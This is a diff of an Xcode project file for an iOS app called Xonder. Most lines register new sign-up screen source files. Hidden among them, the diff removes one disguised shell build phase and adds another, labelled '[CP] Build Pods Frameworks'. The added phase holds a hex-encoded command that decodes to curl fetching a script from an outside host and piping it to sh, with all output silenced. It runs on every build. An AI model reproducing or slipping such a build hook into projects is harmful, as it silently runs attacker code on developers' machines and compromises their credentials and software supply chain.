@@ -45,11 +45,22 @@
 		7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360D26432A5B0062039F /* LaunchScreen.storyboard */; };
 		7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */; };
 		7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */; };
+		707583022657E3AD0055DF8A /* CountrySelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583012657E3AD0055DF8A /* CountrySelectViewController.swift */; };
+		707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */; };
+		707583082657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */; };
+		7075830B2657E4FA0055DF8A /* SelectMoneyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */; };
+		7075830E2657E5180055DF8A /* SocialLinkScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */; };
+		707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583102657E5E70055DF8A /* YourProductViewController.swift */; };
+		707583142657E7DA0055DF8A /* SelectCategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */; };
+		707583172657E7F00055DF8A /* SelectSubcategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */; };
+		7075831A2657E8640055DF8A /* DigitCodeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583192657E8640055DF8A /* DigitCodeViewController.swift */; };
+		7075831D2657E8860055DF8A /* PrimaryReasonViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */; };
+		707583202657E8A40055DF8A /* PasswordScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */; };
+		707583232657E92A0055DF8A /* EmailAddressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583222657E92A0055DF8A /* EmailAddressViewController.swift */; };
+		707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583252657E9420055DF8A /* MobileNumberViewController.swift */; };
+		707583292657E9590055DF8A /* CreatePasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583282657E9590055DF8A /* CreatePasswordViewController.swift */; };
 		707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */; };
-		70FDF60A264BA39E00707EAB /* Signup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 70FDF609264BA39E00707EAB /* Signup.storyboard */; };
-		70FDF60F264E8BC200707EAB /* SignupBusinessSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */; };
-		70FDF612264E8BCA00707EAB /* SignupOTPViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */; };
-		70FDF615264E8BDC00707EAB /* SignupMobileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */; };
+		70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */; };
 		C83FB7252643388E00A87093 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB7242643388E00A87093 /* Constants.swift */; };
 		C83FB72826433B5500A87093 /* UserModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72726433B5500A87093 /* UserModel.swift */; };
 		C83FB72B26433BF300A87093 /* Provider.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72A26433BF300A87093 /* Provider.swift */; };
@@ -104,11 +115,24 @@
 		7060360B26432A5B0062039F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		7060360E26432A5B0062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		7060361026432A5B0062039F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
-
 		7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = YourCustomersScreenViewController.swift; path = "/Users/daniyal/Documents/GitHub/Xonder/Xonder/Xonder/Controllers/SignUp Screen VC/YourCustomersScreenViewController.swift"; sourceTree = "<absolute>"; };
 		7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourCustomerScreenTableViewCell.swift; sourceTree = "<group>"; };
+		707583012657E3AD0055DF8A /* CountrySelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountrySelectViewController.swift; sourceTree = "<group>"; };
+		707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectNumberOfPaymentsViewController.swift; sourceTree = "<group>"; };
+		707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectPaymentPerMonthViewController.swift; sourceTree = "<group>"; };
+		7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectMoneyViewController.swift; sourceTree = "<group>"; };
+		7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocialLinkScreenViewController.swift; sourceTree = "<group>"; };
+		707583102657E5E70055DF8A /* YourProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourProductViewController.swift; sourceTree = "<group>"; };
+		707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCategoryViewController.swift; sourceTree = "<group>"; };
+		707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectSubcategoryViewController.swift; sourceTree = "<group>"; };
+		707583192657E8640055DF8A /* DigitCodeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DigitCodeViewController.swift; sourceTree = "<group>"; };
+		7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrimaryReasonViewController.swift; sourceTree = "<group>"; };
+		7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PasswordScreenViewController.swift; sourceTree = "<group>"; };
+		707583222657E92A0055DF8A /* EmailAddressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailAddressViewController.swift; sourceTree = "<group>"; };
+		707583252657E9420055DF8A /* MobileNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MobileNumberViewController.swift; sourceTree = "<group>"; };
+		707583282657E9590055DF8A /* CreatePasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreatePasswordViewController.swift; sourceTree = "<group>"; };
 		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
-		70FDF609264BA39E00707EAB /* Signup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Signup.storyboard; sourceTree = "<group>"; };
+		70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupVerifyNumberViewController.swift; sourceTree = "<group>"; };
 		70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupBusinessSelectionViewController.swift; sourceTree = "<group>"; };
 		70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupOTPViewController.swift; sourceTree = "<group>"; };
 		70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupMobileViewController.swift; sourceTree = "<group>"; };
@@ -264,6 +288,21 @@
 				704F32352648D5B10027397B /* CountryListTableViewCell.swift */,
 				704F32342648D5B10027397B /* CountryListViewController.swift */,
 				707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */,
+				70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */,
+				707583012657E3AD0055DF8A /* CountrySelectViewController.swift */,
+				707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */,
+				707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */,
+				7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */,
+				7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */,
+				707583102657E5E70055DF8A /* YourProductViewController.swift */,
+				707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */,
+				707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */,
+				707583192657E8640055DF8A /* DigitCodeViewController.swift */,
+				7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */,
+				7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */,
+				707583222657E92A0055DF8A /* EmailAddressViewController.swift */,
+				707583252657E9420055DF8A /* MobileNumberViewController.swift */,
+				707583282657E9590055DF8A /* CreatePasswordViewController.swift */,
 			);
 			path = "SignUp Screen VC";
 			sourceTree = "<group>";
@@ -429,10 +468,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
-
-				4DA40326F74E3EFBB66D902C /* Assets Catalog Builder */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
-				FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */,
+				DEB122941EC0457ED36D902C /* [CP] Build Pods Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -503,30 +540,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	4DA40326F74E3EFBB66D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
-61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
 		4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -566,8 +579,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-
-		FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */ = {
+		DEB122941EC0457ED36D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -583,7 +595,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -593,25 +605,38 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
 			buildActionMask = 2147483647;
 			files = (
 				3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */,
+				707583202657E8A40055DF8A /* PasswordScreenViewController.swift in Sources */,
 				3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */,
 				3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */,
 				7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */,
+				707583082657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift in Sources */,
 				704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */,
+				707583022657E3AD0055DF8A /* CountrySelectViewController.swift in Sources */,
+				707583232657E92A0055DF8A /* EmailAddressViewController.swift in Sources */,
 				3B91AB28264BFF7100B0C0EF /* DashboardViewController.swift in Sources */,
 				704FCAF72645224E0025F546 /* UIButton.swift in Sources */,
+				707583292657E9590055DF8A /* CreatePasswordViewController.swift in Sources */,
+				707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
 				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
 				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
 				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
 				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
+				707583172657E7F00055DF8A /* SelectSubcategoryViewController.swift in Sources */,
 				3BFD804926528BB600ABE8E3 /* SearchTableViewCell.swift in Sources */,
 				C8727086264340F7005EFDEA /* Extension+Error.swift in Sources */,
 				3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */,
+				7075831A2657E8640055DF8A /* DigitCodeViewController.swift in Sources */,
+				7075830B2657E4FA0055DF8A /* SelectMoneyViewController.swift in Sources */,
 				7060360726432A560062039F /* ViewController.swift in Sources */,
+				707583142657E7DA0055DF8A /* SelectCategoryViewController.swift in Sources */,
+				7075830E2657E5180055DF8A /* SocialLinkScreenViewController.swift in Sources */,
 				C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */,
+				70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */,
 				3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */,
 				C8727083264340E0005EFDEA /* Extension+Result.swift in Sources */,
 				C89B5B18264336F300263F14 /* Services.swift in Sources */,
+				7075831D2657E8860055DF8A /* PrimaryReasonViewController.swift in Sources */,
 				704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */,
 				3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */,
 				3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */,
@@ -622,6 +647,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
 				3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */,
 				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
 				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
+				707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */,
 				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
 				7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */,
@@ -629,6 +655,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
 				707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */,
 				704FCAFE264522820025F546 /* UIView.swift in Sources */,
 				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
+				707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */,
 				3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
